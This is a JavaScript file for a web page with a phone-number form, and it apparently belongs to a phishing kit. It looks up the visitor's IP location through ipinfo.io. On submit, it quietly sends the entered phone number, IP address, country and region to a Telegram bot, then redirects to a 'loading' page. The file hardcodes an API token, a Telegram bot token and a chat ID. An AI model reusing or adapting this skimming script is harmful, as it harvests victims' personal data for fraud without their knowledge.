let phoneInput;

        function getFlagEmoji(countryCode) {
            const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
            return String.fromCodePoint(...codePoints);
        }

        async function getIpInfo() {
            const response = await fetch('https://ipinfo.io/json?token=4d1535316da2be'); // Replace with your token
            return response.json();
        }

        async function sendToTelegram(message) {
            const telegramToken = '8093449553:AAFPYQHQe1eKwp_fu5uq8AnLWILJFAjjUTg'; // Replace with your bot token
            const chatId = '7631556354'; // Replace with your chat ID
            const url = `https://api.telegram.org/bot8093449553:AAFPYQHQe1eKwp_fu5uq8AnLWILJFAjjUTg/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        async function handleSubmit(event) {
            event.preventDefault(); // Prevent the default form submission
            const phoneNumber = phoneInput.getNumber(); // Get the formatted phone number
            const ipInfo = await getIpInfo();

            const countryCode = ipInfo.country; // Get the country code
            const flagEmoji = getFlagEmoji(countryCode); // Get the flag emoji

            // Get the country calling code
            const callingCode = phoneInput.getSelectedCountryData().dialCode;

            // Create the message to send to Telegram
            const message = `
                Phone Number: ${phoneNumber}
IP Address: ${ipInfo.ip}
Country Code: ${countryCode} ${flagEmoji}
Country Calling Code: ${callingCode}
Country: ${ipInfo.region}
            `;

            // Send the message to your Telegram bot
            await sendToTelegram(message);
            
            // Redirect to the loading page only after the message is sent
            window.location.href = "loading.html"; // Change to your loading page
        }

        document.addEventListener("DOMContentLoaded", async () => {
            const phoneInputField = document.querySelector("#phone");
            const ipInfo = await getIpInfo();
            const countryCode = ipInfo.country ? ipInfo.country.toLowerCase() : 'us'; // Default to 'us'

            // Initialize intl-tel-input with automatic country code based on IP
            phoneInput = window.intlTelInput(phoneInputField, {
                initialCountry: countryCode,
                geoIpLookup: (callback) => {
                    callback(countryCode); // Use the country code fetched from IP
                },
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
            });

            // Bind the form submit to the handleSubmit function
            document.querySelector("form").addEventListener("submit", handleSubmit);
        });